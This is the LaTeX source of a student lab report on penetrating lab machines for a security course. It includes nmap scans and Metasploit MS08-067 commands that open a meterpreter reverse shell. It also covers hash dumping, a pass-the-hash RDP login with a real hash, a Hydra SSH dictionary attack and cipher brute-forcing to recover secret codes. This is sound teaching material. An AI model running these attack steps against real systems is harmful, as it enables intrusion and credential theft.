\documentclass{article}
\bibliographystyle{ieeetran}
% The first of these two packages allow for accented characters to be copied
% from the resulting PDF properly, and the second package allows for accented
% characters to be entered in the TeX file
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}

% Clickable hyperlinks in the report with \url
\usepackage[hyphens]{url}

% Makes it easy to refer to listings, figures, and the likes of them with
% \autoref{labelName}
\usepackage{hyperref}

% Enable to insert images
\usepackage{graphicx} 

% The listings package is useful for including source code in the report.
% It provides (among other things):
%   * lstlisting environment for listing code directly
%   * lstinputlistings command for listing code from a file
%   * lstinline command for code appearing in the middle of a sentence
\usepackage{listings}
\lstset{%
  language=Bash,
  frame=single,
  numbers=left,
%  basicstyle=\ttfamily,
  breaklines=true,
  columns=fullflexible
}


\usepackage{xcolor}

\usepackage{verbatim}

% Increases the chance that things will fit on a line properly :)
\usepackage{fullpage}

% Make enumerate go (a), (b), ... instead of 1., 2., ...
\renewcommand{\labelenumi}{(\alph{enumi})}

% ... and then I., II., ... instead of (a), (b), ...
\renewcommand{\labelenumii}{\Roman{enumii}.}

% The enumerate package and \begin{enumerate}[(a)] or the likes of it can be
% used to break the norm though
\usepackage{enumerate}

% Avoids "code" duplication
\newcommand{\highergradesonly}{[\textbf{higher grades only}]}

% Possibly useful things for making the text more readable
\newcommand{\program}[1]{\textit{#1}}
\newcommand{\service}[1]{\textit{#1}}
\newcommand{\command}[1]{\textit{#1}}
\newcommand{\code}[1]{\textit{#1}}
\newcommand{\flag}[1]{\textit{#1}}
\newcommand{\myurl}[1]{\textit{#1}}
\newcommand{\user}[1]{\textit{#1}}
\newcommand{\password}[1]{\textit{#1}}
\newcommand{\directory}[1]{\textit{#1}}
\newcommand{\file}[1]{\textit{#1}}
\newcommand{\parameter}[1]{\textit{#1}}
\newcommand{\exploitname}[1]{\textit{#1}}
\newcommand{\msexploit}[1]{#1}
\newcommand{\option}[1]{#1}
\newcommand{\payloadname}[1]{#1}
\newcommand{\ipaddress}[1]{#1}
\newcommand{\ip}[1]{\ipaddress{#1}}
\newcommand{\filename}[1]{#1}

\title{\textbf{Secure Computer Systems I: Lab 3}}
\author{Ren Li \and Tianyao Ma \and Samuel Pettersson}

\begin{document}
\maketitle
\section*{Host 1: 192.168.233.20}
\par We firstly scanned the open ports by using the command \textit{nmap -s -A -p1-1024 192.168.233.20}. There are the possibility that some ports will not always be opened, or rather, they will be down at times. But we found that the result below is the most common one:
\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
security@BB:~$ sudo nmap -v -A -p1-8000 192.168.233.106

Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-05 00:37 CET
NSE: Loaded 110 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 00:37
Scanning 192.168.233.20 [4 ports]
Completed Ping Scan at 00:37, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:37
Completed Parallel DNS resolution of 1 host. at 00:37, 0.00s elapsed
Initiating SYN Stealth Scan at 00:37
Scanning 192.168.233.20 [8000 ports]
Discovered open port 445/tcp on 192.168.233.20
Discovered open port 1025/tcp on 192.168.233.20
Discovered open port 139/tcp on 192.168.233.20
Discovered open port 3389/tcp on 192.168.233.20
Discovered open port 135/tcp on 192.168.233.20
Discovered open port 1026/tcp on 192.168.233.20
Completed SYN Stealth Scan at 00:37, 2.22s elapsed (8000 total ports)
Initiating Service scan at 00:37
Scanning 6 services on 192.168.233.20
Completed Service scan at 00:38, 48.67s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 192.168.233.20
Retrying OS detection (try #2) against 192.168.233.20
Retrying OS detection (try #3) against 192.168.233.20
Retrying OS detection (try #4) against 192.168.233.20
Retrying OS detection (try #5) against 192.168.233.20
Initiating Traceroute at 00:38
Completed Traceroute at 00:38, 0.01s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:38
Completed Parallel DNS resolution of 2 hosts. at 00:38, 0.00s elapsed
NSE: Script scanning 192.168.233.20.
Initiating NSE at 00:38
Completed NSE at 00:38, 0.93s elapsed
Nmap scan report for 192.168.233.20
Host is up (0.0077s latency).
Not shown: 7994 closed ports
PORT     STATE SERVICE        VERSION
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds   Microsoft Windows 2003 or 2008 microsoft-ds
1025/tcp open  msrpc          Microsoft Windows RPC
1026/tcp open  msrpc          Microsoft Windows RPC
3389/tcp open  ms-wbt-server?
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.40%E=4%D=3/5%OT=135%CT=1%CU=38086%PV=Y%DS=2%DC=T%G=Y%TM=531663E
OS:6%P=i686-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=0)O
OS:PS(O1=M538NW0NNT00NNS%O2=M538NW0NNT00NNS%O3=M538NW0NNT00%O4=M538NW0NNT00
OS:NNS%O5=M538NW0NNT00NNS%O6=M538NNT00NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FF
OS:FF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M538NW0NNS%CC=N%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=FFFF%S=O%A=S+%F=AS%O=M538NW0NNT00NNS%RD=0%Q=)T4(
OS:R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T
OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: 
|   NetBIOS name: SRV1, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:01:5a:72 (VMware)
|   Names
|     SRV1<00>             Flags: <unique><active>
|     POETSCAFE<00>        Flags: <group><active>
|     SRV1<20>             Flags: <unique><active>
|_    POETSCAFE<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows Server 2003 3790 (Windows Server 2003 5.2)
|   OS CPE: cpe:/o:microsoft:windows_server_2003::-
|   Computer name: SRV1
|   NetBIOS computer name: SRV1
|   Domain name: poetscafe.local
|   Forest name: poetscafe.local
|   FQDN: SRV1.poetscafe.local
|   NetBIOS domain name: POETSCAFE
|_  System time: 2014-03-05T01:39:49+01:00
| smb-security-mode: 
|   Account that was used for smb scripts: <blank>
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   7.92 ms 10.11.12.1
2   7.65 ms 192.168.233.20

NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.19 seconds
           Raw packets sent: 8094 (359.682KB) | Rcvd: 8093 (326.558KB)

\end{lstlisting}
We found that in port 445 it runs Windows 2003 or 2008 microsoft-ds service, which could exist a flaw. So we searched the Metasploit database and found an exploit called \lstinline{ms08_067_netapi}. It exploits a parsing flaw through the service. We type the following command in the metasploit console:
\begin{itemize}
	\item \lstinline{use exploit/windows/smb/ms08_067_netapi} 
	\item set RHOST 192.168.233.20
	\item \lstinline{set payload windows/meterpreter/reverse_tcp} 
	\item set LHOST 10.11.12.29
	\item run
	\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
[*] Started reverse handler on 10.11.12.29:4444 
[*] Automatically detecting the target...
[*] Fingerprint: Windows 2003 - No Service Pack - lang:Unknown
[*] Selected Target: Windows 2003 SP0 Universal
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.233.20
[*] Meterpreter session 2 opened (10.11.12.29:4444 -> 192.168.233.20:1069) at 2014-03-05 00:57:55 +0100
	\end{lstlisting}
	We now get the root access of the machine.By typing \textit{getuid} it shows \lstinline{NT AUTHORITY\SYSTEM}. And we can type other commands to browse the file or view its content. We use \textit{search -f secret.txt} command and found that there do have a file called secret.txt. We opened it, which showed the code:c5zmfVpkSJrFA.
\end{itemize}
\section*{Host 2: 192.168.233.110}
The second host to which root access was gained is \ip{192.168.233.110}. The instructions said that access to host \ip{192.168.233.20} was required to access this machine.

Running \program{nmap} showed that two services were running on the target machine: \service{Microsoft Windows RPC} on port 135 and \service{Microsoft Terminal Service} on port 3389, the latter being used for serving remote desktop clients.

With no obvious vulnerabilities being present in the RPC service, attention was turned to the remote desktop service. The RDP client of our choice was (initially) \program{rdesktop}, which is available in the software package repository and was installed by issuing the command \command{sudo apt-get install rdesktop}.

Connecting to the other machine was as simple as running the command \command{rdesktop 192.168.233.110}. Upon doing so, we were presented with the Modern UI login screen. Authentication as the administrator appeared to require a smart card, whereas password authentication was an option for other users.

After some tinkering with a remote desktop connection on host \ip{192.168.233.20}, we found out that password authentication as the administrator on \ip{192.168.233.110} was possible by starting a remote desktop session from \ip{192.168.233.20} to \ip{192.168.233.110}. One could suspect that the administrator password for the two machines were the same, but despite having root access to \ip{192.168.233.20}, we were unaware of what the password to the administrator account was.

The immediate thought was to dump the password hashes on host \ip{192.168.233.20} and have them cracked either by brute force or with a dictionary. Dumping the hashes is simple enough with a meterpreter shell: issuing the command \command{run hashdump} does the trick. For each user, two hashes were stored: an unused LM hash of the empty string and an NT hash. Unfortunately, the version of John the Ripper available on the BackBox machine did not have support for breaking NT hashes. The source code of the latest ``jumbo'' version of John the Ripper (version 1.7.9-7) with support for NT hashes was downloaded from \url{http://www.openwall.com/john/}. Building the application was a matter of running two \program{make} commands: \command{make} and \command{make clean linux-x86-mmx} as per the README and the installation instructions. After having run the jumbo version of John the Ripper for several hours without finding a password matching any of the dumped NT hashes, let alone the hash for the administrator account, the trail grew colder and we gave up on retrieving the password.

After having received a hint from Sofia, we decided to look into the possibility of passing the hash of the administrator on \ip{192.168.233.20} (CL3\textbackslash Administrator). That is, instead of authenticating with a password, we hoped to be able to authenticate with the hash of the password. Some research showed that Microsoft's Remote Desktop Protocol version 8.1 from last year introduced a Restricted Admin mode, in which credentials in the form of passwords are not sent to the remote server; instead, password hashes are sent. This mode was introduced in an effort to improve security in that authentication to a compromised server does not reveal the password in cleartext, but unfortunately, it comes at the expense of allowing pass the hash attacks\cite{portcullis_blog13}. Further research showed that an RDP client by the name FreeRDP with support for passing hashes was available in the form of a Git repository at GitHub\cite{portcullis_tools13}\cite{freerdp_git_repo}.

The repository was cloned and the application was built by following the installation instructions available at GitHub\cite{freerdp_installation_instructions}. The necessary packages were installed, \program{cmake} was used to generate Makefiles, and \program{make} was used to build and install the application. After having completed the installation, the client was available by the name \program{xfreerdp}.

The following command was executed to attempt to log on as the administrator with the hash retrieved from host \ip{192.168.233.20}: \command{xfreerdp /u:Administrator /pth:fabc417905666832e4b4ba57711a4171 /v:192.168.233.110}. Passing the hash turned out to work! A text file containing the secret code without any encryption was easily spotted on the desktop. The code read: \code{vZxkRvEICzhNQ}.

\section*{Host 3: 192.168.233.106}

\section*{Host 4: 192.168.233.30}
An \program{nmap} scan of the fourth and final victim showed that there were two services running on the host, namely, an SSH service and an HTTP service. The command and the most important parts of its output is shown below.
\verbatiminput{nmap_30.txt}
The \flag{v} flag specifies verbose output, and the \flag{A} flag specifies that OS and service detection (among other things) should be carried out.

Neither of the services appeared to have vulnerabilities that could easily be exploited, so, seeing as we knew no users on the system, it was a natural decision to look for information at the website that the HTTP server hosted first. Browsing to \myurl{192.168.233.30} in a web browser showed the website of Nuyorican Poets Cafe. When looking at the page on the history of the cafe (\myurl{192.168.233.30/history.php}), three particularly interesting names were found: Daniel Gallant, Jason Quinones, and Mahogany Browne, listed as programmers. Furthermore, there were mailto links that would indicate that their usernames were \user{daniel}, \user{jason}, and \user{mobrowne}.

With these usernames, we could carry out a dictionary attack on their accounts over SSH. The tool that we used for this was the network logon cracker \program{THC-Hydra}\cite{hydra}, and the word list provided to the program was the list of common Unix passwords available in \directory{/opt/backbox/msf/data/wordlists/} on our BackBox system. Within a few minutes, \program{Hydra} had discovered that \password{cuteme} was the password for the user \user{jason}. The important lines of output are shown below:
\verbatiminput{hydra_output_30.txt}
The obtained credentials for \user{jason} were used to log on via SSH. Running the command \command{sudo -l} to list the commands allowed for \user{jason} showed that he was allowed to run any command. The command \command{find / -name *secret*} was issued to find the secret file, and it showed that a file by the name \file{secret.txt.enc} was located in \directory{/root/}; the file appeared to be encrypted. In the very same directory, there was a subdirectory called \directory{.keys/} that contained a file called \file{passwd-file}. It would seem that this file contained the password used when encrypting the secret. The content of the password file is shown below.
\verbatiminput{passwd-file}
In order to analyze things more carefully, we copied the encrypted secret and the password file to the home folder of \user{jason} and then to our local machine using \program{scp}. The encrypted file started with a string ``Salted\_\_''. Googling on the corresponding bytes in hexadecimal seemed to indicate that it was the work of OpenSSL. This agreed with similar cases in the solutions for the lab last year, which we had asked for and received from Sofia. Not at all knowing which of the 100 encryption methods shown to be available in \program{openssl} when executing \command{openssl enc .} had been used, we created a bash script for trying each and every one of them. The script is shown in \autoref{lst:decrypt} below.

\lstinputlisting[
  label=lst:decrypt,
  caption={A Bash script for decrypting the secret.}
]
                {foo2.sh}
The first 34 lines of the script is just assigning a variable an array of the available encryption methods (or cipher commands). Line 36--38 constitute a loop whose body is executed once for each cipher command. The command on line 37 is the one doing all the decryption. The first appearance of \verb|$command| specifies the cipher command, the \flag{d} flag denotes decryption, the \parameter{in} and \parameter{out} parameters specify the input file to decrypt and the output file in which to store the result, and the \parameter{pass} parameter specifies the password to use when decrypting. As can be seen, the output file for each decryption is specified to be placed in the directory \directory{output} and be named after the cipher command used.

After having executed the shell script, all the output files were manually scanned for intelligible information. It turned out that the output file corresponding to the cipher command aes-256-ofb contained the secret in plaintext. The code read: P2EOlbVN4vf5A, and the secret in its entirety is shown below.
\verbatiminput{secret_30.txt}






\bibliography{lab3}
\end{document}
